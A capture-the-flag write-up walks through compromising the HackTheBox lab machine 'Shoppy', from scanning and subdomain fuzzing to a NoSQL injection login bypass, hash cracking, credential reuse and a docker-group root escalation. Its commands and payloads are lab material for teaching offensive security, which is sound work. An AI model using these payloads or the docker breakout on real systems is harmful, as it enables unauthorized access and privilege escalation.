---
title: "HackTheBox - Shoppy"
author: Nasrallah
description: ""
date: 2023-01-17 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, sudo, subdomains, ffuf, nosqli]
img_path: /assets/img/hackthebox/machines/shoppy
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing **Shoppy** from [HackTheBox](https://www.hackthebox.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.180
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found to open ports, port 22 running OpenSSH and port 80 running Nginx.

We see that the http-title nmap script shows a redirect to `http://shoppy.htb`, so let's add that to our /ets/hosts file.

## Web

Let's navigate to the web page.

![](1.png)

We see a countdown of the release of shoppy beta, i check the source code and didn't find anything interesting.

Part of the enumeration phase is checking the error message for non existing page, so let's request a random page.

![](2.png)

Googling the error we find that we're dealing with a `node js` application.

![](3.png)

### Gobuster

Let's run a directory scan.

```terminal
└──╼ $ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://shoppy.htb/                                                     
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/16 09:38:08 Starting gobuster in directory enumeration mode
===============================================================
/ADMIN                (Status: 302) [Size: 28] [--> /login]
/Admin                (Status: 302) [Size: 28] [--> /login]
/Login                (Status: 200) [Size: 1074]           
/admin                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]   
/exports              (Status: 301) [Size: 181] [--> /exports/]
/favicon.ico          (Status: 200) [Size: 213054]             
/fonts                (Status: 301) [Size: 177] [--> /fonts/]  
/images               (Status: 301) [Size: 179] [--> /images/] 
/js                   (Status: 301) [Size: 171] [--> /js/]     
/login                (Status: 200) [Size: 1074]               
                                                               
===============================================================
```

We found a login page, let's check it out.

![](5.png)

We have a login form for Shoppy, i tried some default credentials but no luck with that.

Since this is a node js app, i googled which database are used with it and found the following.

![](4.png)

Node js can be used with MongoDB which is a NoSQL database.

We can try a NoSql injection using this payload `admin' || '1'=='1` as a username.

![](6.png)

We logged in. In this page we see a `search for users` button. Using the same payload, i searched for `admin' || '1'=='1`.

![](7.png)

Clicking on the download button we get the following.

![](8.png)

We see two users, root and josh and their hashes.

The hashes look like MD5, so we can use [crackstation.net](https://crackstation.net/) to crack them.

![](9.png)

We managed to get `josh`'s password.

I tried to ssh with that but no luck.

### Subdomains

Let's enumerate for subdomains using ffuf.

```bash
└──╼ $ ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb/ -H "Host: FUZZ.shoppy.htb/" -fw 5

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://shoppy.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.shoppy.htb/
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 5
________________________________________________

mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 150ms]
:: Progress: [100000/100000] :: Job [1/1] :: 318 req/sec :: Duration: [0:05:36] :: Errors: 0 ::
                                                                                 
```

We found the subdomain `mattermost`, let's add it to etc/hosts file and navigate to it.

![](10.png)

We found a login page, let's login as `josh`.

![](11.png)

Great! We got in.

# **Foothold**

Checking different tabs we find a conversation between `josh` and `jaeger` where the latter has gave his credentials.

![](12.png)

Let's use that and ssh to the machine.

![](13.png)

# **Privilege Escalation**

Let's check `jaeger`'s privileges on this machine.

```bash
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

We can run `password-manager` as user `deploy`, let's run it and see what it does.

```bash
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: asdf
Access denied! This incident will be reported !
```

It asks us for a password but we don't know it.

I used `strings` on the file but didn't file anything interesting.

Checking different encoding with `strings` we manage to find the password.

```bash
jaeger@shoppy:~$ strings -e l /home/deploy/password-manager
Sample
```

Let's submit the password:

```bash
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

We got `deploy`'s password. Let's ssh as deploy.

![](14.png)

Right away we see that `deploy` is part of `docker` group. Let's check for available docker images.

```bash
$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   6 months ago   5.53MB
```

`alpine` is available, so let's go to [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell)

![](15.png)

We can run the following command and get root.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![](16.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).